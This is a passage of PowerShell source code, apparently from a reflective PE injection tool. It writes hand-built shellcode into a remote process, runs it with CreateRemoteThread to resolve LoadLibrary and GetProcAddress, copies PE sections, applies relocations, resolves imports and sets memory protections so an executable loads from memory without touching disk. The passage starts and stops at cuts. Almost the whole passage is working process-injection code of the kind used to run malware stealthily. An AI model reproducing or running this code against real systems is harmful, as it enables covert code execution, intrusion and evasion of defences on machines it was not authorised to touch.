			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
